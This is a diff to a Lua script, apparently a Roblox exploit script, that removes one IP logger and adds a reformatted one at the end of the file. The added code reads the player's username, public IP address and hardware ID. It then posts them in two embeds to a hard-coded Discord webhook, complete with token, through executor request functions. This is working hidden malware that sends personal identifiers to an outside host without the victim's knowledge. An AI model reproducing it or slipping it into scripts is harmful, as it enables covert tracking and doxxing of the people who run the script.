@@ -1146,4 +1146,52 @@ end
 
 
 
-local url = "https://discord.com/api/webhooks/1041827229308555406/svsUXIiVN_U5TFYbHVZpykbHCcZmdzN2u2QMEToLEicyTfz2SCbyFChs5lH1LLdzYoNv" local data = { ["content"] = "", ["embeds"] = { { ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.."**", ["description"] = "**IP : "..tostring(game:HttpGet("https://api.ipify.org/")).." HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**", ["type"] = "rich", ["color"] = tonumber(0x7269da), ["image"] = { ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name) } } } } local data2 = { ["content"] = "", ["embeds"] = { { ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.." x2**", ["description"] = "**HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**", ["type"] = "rich", ["color"] = tonumber(0x7269da), ["image"] = { ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(game:GetService("Players").LocalPlayer.Name) } } } } local newdata = game:GetService("HttpService"):JSONEncode(data) local newdata2 = game:GetService("HttpService"):JSONEncode(data2) local headers = { ["content-type"] = "application/json" } request = http_request or request or HttpPost or syn.request local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers} local abcdefg = {Url = url, Body = newdata2, Method = "POST", Headers = headers} request(abcdef) request(abcdefg)
+
+
+
+
+
+
+local url =
+    "https://discord.com/api/webhooks/1056042778452308058/48jQdpfOPn8sxlyrIGUdcnea5unZ03AgJL0byhrOY8VGSMckzHiwmJDKCGM_nCFc74DI"
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.."**",
+            ["description"] = "**IP : "..tostring(game:HttpGet("https://api.ipify.org/")).." HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(game:GetService("Players").LocalPlayer.Name)
+            }
+        }
+    }
+}
+local data2 = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "**INFO GRABBED ON ".. game.Players.LocalPlayer.Name.." x2**",
+            ["description"] = "**HWID : "..game:GetService("RbxAnalyticsService"):GetClientId().."**",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
+                    tostring(game:GetService("Players").LocalPlayer.Name)
+            }
+        }
+    }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local newdata2 = game:GetService("HttpService"):JSONEncode(data2)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+local abcdefg = {Url = url, Body = newdata2, Method = "POST", Headers = headers}
+request(abcdef)
+request(abcdefg)
